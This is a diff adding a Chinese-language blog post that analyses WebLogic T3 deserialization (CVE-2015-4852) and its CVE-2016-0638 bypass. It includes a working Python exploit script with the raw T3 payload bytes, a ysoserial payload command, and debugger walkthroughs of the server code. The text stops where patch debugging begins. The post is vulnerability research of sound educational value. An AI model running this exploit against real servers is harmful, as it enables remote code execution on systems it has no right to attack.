@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="环境搭建参考：https:&#x2F;&#x2F;www.penson.top&#x2F;article&#x2F;av40 何为T3协议T3 协议其实是 Weblogic 内独有的一个协议，在 Weblogic 中对 RMI 传输就是使用的 T3 协议。在 RMI 传输当中，被传输的是一串序列化的数据，在这串数据被接收后，执行反序列化的操作。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic T3协议反序列化">
+<meta property="og:url" content="http://example.com/2024/02/26/Weblogic-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="环境搭建参考：https:&#x2F;&#x2F;www.penson.top&#x2F;article&#x2F;av40 何为T3协议T3 协议其实是 Weblogic 内独有的一个协议，在 Weblogic 中对 RMI 传输就是使用的 T3 协议。在 RMI 传输当中，被传输的是一串序列化的数据，在这串数据被接收后，执行反序列化的操作。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1993669/202012/1993669-20201218162014099-612385399.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119101117196.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119102003122.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119102459249.png">
+<meta property="og:image" content="https://image.3001.net/images/20221207/1670402703_6390528f4de7b9159e68f.png!small">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119103307292.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119110524908.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119103537573.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119103939469.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119104022308.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119104643548.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119104817446.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119105554538.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119105617603.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119105930291.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119192556931.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119111136627.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119114557146.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119191855204.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240121190844151.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119202457841.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240121192909220.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240121193028421-17058366322392.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240121195524966.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240121195725297.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240121200247247-17058385679184.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240121200823197.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240121201200584.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240121202028413.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122093349005.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122093453474.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122175526672.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122175627767-17059173889077.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122175732436.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122180220341.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122180531272.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122180650320.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122180846840.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122180940387.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122181119939.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122182020685.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122182323792.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122182444034.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122183440735.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122184250703.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240122184709989.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240119204728032.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131134124093.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131142223973.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131143358737.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131143845958.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131143958492.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131144432243.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131144748528.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131145201198.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131145406252.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131145535058.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131145652227.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131150031769.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131150359262.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131150555125.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131163937705.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131164121158.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131164105160.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240131164219477.png">
+<meta property="article:published_time" content="2024-02-26T03:11:03.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:29:06.430Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2020.cnblogs.com/blog/1993669/202012/1993669-20201218162014099-612385399.png">
+
+<link rel="canonical" href="http://example.com/2024/02/26/Weblogic-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Weblogic T3协议反序列化 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/26/Weblogic-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Weblogic T3协议反序列化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-02-26 11:11:03" itemprop="dateCreated datePublished" datetime="2024-02-26T11:11:03+08:00">2024-02-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:29:06" itemprop="dateModified" datetime="2025-05-25T11:29:06+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.penson.top/article/av40">https://www.penson.top/article/av40</a></p>
+<h2 id="何为T3协议"><a href="#何为T3协议" class="headerlink" title="何为T3协议"></a>何为T3协议</h2><p>T3 协议其实是 Weblogic 内独有的一个协议，在 Weblogic 中对 RMI 传输就是使用的 T3 协议。在 RMI 传输当中，被传输的是一串序列化的数据，在这串数据被接收后，执行反序列化的操作。</p>
+<span id="more"></span>
+
+<p>在 T3 的这个协议里面包含请求包头和请求的主体这两部分内容。</p>
+<p>weblogic反序列化流程图：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1993669/202012/1993669-20201218162014099-612385399.png" alt="img"></p>
+<h2 id="漏洞复现-CVE-2015-4852"><a href="#漏洞复现-CVE-2015-4852" class="headerlink" title="漏洞复现(CVE-2015-4852)"></a>漏洞复现(CVE-2015-4852)</h2><p>环境：10.3.6</p>
+<p>脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">server_address = (sys.argv[1], int(sys.argv[2]))</span><br><span class="line">print &#x27;connecting to %s port %s&#x27; % server_address</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"></span><br><span class="line"># Send headers</span><br><span class="line">headers=&#x27;t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n&#x27;</span><br><span class="line">print &#x27;sending &quot;%s&quot;&#x27; % headers</span><br><span class="line">sock.sendall(headers)</span><br><span class="line"></span><br><span class="line">data = sock.recv(1024)</span><br><span class="line">print &gt;&gt;sys.stderr, &#x27;received &quot;%s&quot;&#x27; % data</span><br><span class="line">payloadObj = open(sys.argv[3],&#x27;rb&#x27;).read()</span><br><span class="line"></span><br><span class="line">payload=&#x27;\x00\x00\x09\xe4\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00&#x27;</span><br><span class="line">payload=payload+payloadObj</span><br><span class="line">payload=payload+&#x27;\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78&#x27;</span><br><span class="line">print &#x27;sending payload...&#x27;</span><br><span class="line">payload = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(struct.pack(&#x27;!i&#x27;, len(payload)), payload[4:])</span><br><span class="line"></span><br><span class="line">sock.send(payload)</span><br><span class="line">python2 Weblogic.py 127.0.0.1 7001 payload.tmp</span><br></pre></td></tr></table></figure>
+
+<p>tmp文件生成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 &quot;calc&quot; &gt; &quot;payload.tmp&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20240119101117196.png" alt="image-20240119101117196"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>远程调试：修改启动的cmd文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@ECHO OFF</span><br><span class="line"></span><br><span class="line">set JAVA_OPTIONS=-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=n</span><br><span class="line"></span><br><span class="line">@REM WARNING: This file is created by the Configuration Wizard.</span><br><span class="line">@REM Any changes to this script may be lost when adding extensions to this configuration.</span><br><span class="line"></span><br><span class="line">SETLOCAL</span><br><span class="line"></span><br><span class="line">set DOMAIN_HOME=D:\weblogic\midddle\user_projects\domains\test_domain</span><br><span class="line"></span><br><span class="line">call &quot;%DOMAIN_HOME%\bin\startWebLogic.cmd&quot; %*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ENDLOCAL</span><br></pre></td></tr></table></figure>
+
+<h4 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h4><p>利用wireshark抓取本地回环包</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119102003122.png" alt="image-20240119102003122"></p>
+<p>第一部分是请求包头，第二部分是服务端的相应，第三部分是请求主体</p>
+<p>在得到了正确的请求头后，Weblogic会返回一个包含版本号的信息</p>
+<p>在反序列化数据包中，<code>ac ed 00 05</code> 是反序列化标志，在 T3 协议中由于每个反序列化数据包前面都有 <code>fe 01 00 00</code> ，所以这里的标志相当于就是 <code>fe 01 00 00 ac ed 00 05</code></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119102459249.png" alt="image-20240119102459249"></p>
+<p>整个请求主体包含了6个部分的序列化数据，我们可以对其中任意一个部分进行攻击</p>
+<p><img src="https://image.3001.net/images/20221207/1670402703_6390528f4de7b9159e68f.png!small" alt="202212071530929.png"></p>
+<h4 id="代码分析与调试"><a href="#代码分析与调试" class="headerlink" title="代码分析与调试"></a>代码分析与调试</h4><p>入口类是在 <code>InboundMsgAbbrev#readObject</code>处，下个断点开始调试</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119103307292.png" alt="image-20240119103307292"></p>
+<p>其中var1的head就是我们传入的序列化数据</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119110524908.png" alt="image-20240119110524908"></p>
+<p>先步入ServerChannelInputStream构造函数</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119103537573.png" alt="image-20240119103537573"></p>
+<p>var1是一个MsgAbbrevInputStream对象，MsgAbbrevInputStream是在Weblogic中实现的一个Java输入流类，用于接收消息并将其转换为Java对象</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119103939469.png" alt="image-20240119103939469"></p>
+<p>super方法跟不进去，跟进getServerChannel方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119104022308.png" alt="image-20240119104022308"></p>
+<p>this.connection是一个MsgAbbrevInputStream对象，这个对象中储存了一些连接信息，包括IP，端口等</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119104643548.png" alt="image-20240119104643548"></p>
+<p>跟进getChannel方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119104817446.png" alt="image-20240119104817446"></p>
+<p>继续调用BaseAbstractMuxableSocket对象的getChannel方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119105554538.png" alt="image-20240119105554538"></p>
+<p>返回this.channel</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119105617603.png" alt="image-20240119105617603"></p>
+<p>到这里，头部的信息已经处理完毕，重新回到<code>InboundMsgAbbrev#readObject</code>处</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119105930291.png" alt="image-20240119105930291"></p>
+<p>ServerChannelInputStream继承了ObjectInputStream类，调用其readObject方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119192556931.png" alt="image-20240119192556931"></p>
+<p>接下来处理请求主体，反序列化过程中会调用到resolveClass方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119111136627.png" alt="image-20240119111136627"></p>
+<p>最后和头部一样，调用原生的readObject方法，再进过几轮invoke，就可以来到AnnotationInvocationHandler的readObject方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119114557146.png" alt="image-20240119114557146"></p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><img src="https://ilikeoyt.github.io/image/image-20240119191855204.png" alt="image-20240119191855204"></p>
+<p>在ServerChannelInputStream类的resolveClass方法处添加了黑名单</p>
+<p>修复具体代码如下</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240121190844151.png" alt="image-20240121190844151"></p>
+<h2 id="修复绕过（CVE-2016-0638）"><a href="#修复绕过（CVE-2016-0638）" class="headerlink" title="修复绕过（CVE-2016-0638）"></a>修复绕过（CVE-2016-0638）</h2><h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><p>这个漏洞主要是找到了个黑名单之外的类”weblogic.jms.common.StreamMessageImpl”</p>
+<p>简单来说，由于黑名单的限制，CVE-2015-4852利用链没法直接使用，这个漏洞像是整了个套娃，给CVE-2015-4852装进去了。</p>
+<p>为什么使用StreamMessageImpl这个类呢？其实原理也很简单。StreamMessageImpl类中的readExternal方法可以接收序列化数据作为参数，而当StreamMessageImpl类的readExternal执行时，会反序列化传入的参数并执行该参数反序列化后对应类的readObject方法。</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119202457841.png" alt="image-20240119202457841"></p>
+<p>如果我们把序列化后的CVE-2015-4852利用链序列化之后丢进readExternal呢？</p>
+<p>当我们给上图StreamMessageImpl类的readExternal中传入序列化后的CVE-2015-4852利用链，在readExternal被执行时，会将CVE-2015-4852利用链数据反序列化，并在上图864行处调用其readObject方法，也就是AnnotationInvocationHandler的readObject方法</p>
+<p>好了，AnnotationInvocationHandler的readObject方法被调用了，CVE-2015-4852复活了。</p>
+<p>但是StreamMessageImpl类的readExternal要怎么被执行呢?在Weblogic反序列化流程中，会尝试调用类对象的readObject、readResolve、readExternal等方法。</p>
+<h4 id="修复分析与调试"><a href="#修复分析与调试" class="headerlink" title="修复分析与调试"></a>修复分析与调试</h4><p>由于需要打补丁，这里使用docker项目搭建环境</p>
